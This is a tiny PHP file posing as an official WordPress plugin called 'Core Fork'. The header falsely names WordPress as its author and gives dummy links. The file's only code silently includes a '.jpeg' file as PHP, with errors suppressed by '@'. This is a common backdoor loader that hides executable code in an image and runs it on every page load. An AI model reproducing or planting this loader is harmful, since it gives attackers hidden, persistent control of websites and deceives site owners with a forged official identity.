<?php
/*
Plugin Name: Core Fork
Plugin URI: http://wordpress.org/#
Description: Official WordPress plugin
Author: WordPress
Version: 19.3.9
Author URI: http://wordpress.org/#
*/

@include './front/front.jpeg';